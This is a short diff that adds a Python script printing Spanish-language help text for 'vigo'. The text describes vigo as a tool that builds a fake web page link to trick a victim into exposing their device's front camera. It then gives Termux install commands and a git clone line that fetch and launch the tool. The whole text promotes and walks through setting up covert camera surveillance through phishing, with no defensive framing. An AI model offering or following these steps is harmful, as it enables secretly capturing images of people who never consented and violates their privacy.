@@ -1,0 +1,27 @@
+print("""
+\033[1;31m¿Qué es vigo?
+
+\033[1;39mvigo es una herramienta que genera un enlace falso de página web que utiliza ingenieria social para acceder a la cámara frontal del dispositivo de la víctima.
+
+\033[1;33mINSTALACIÓN DE vigo EN TERMUX
+
+\033[1;39mapt update && apt upgrade -y
+
+termux-setup-storage
+
+pkg install -y git
+
+pkg install -y php
+
+pkg install -y openssh
+
+pkg install -y python
+
+pkg install -y python2
+
+git clone https://github.com/InformaticayHacking/vigo
+
+cd vigo
+
+\033[1;32mpython vigo.py
+""")
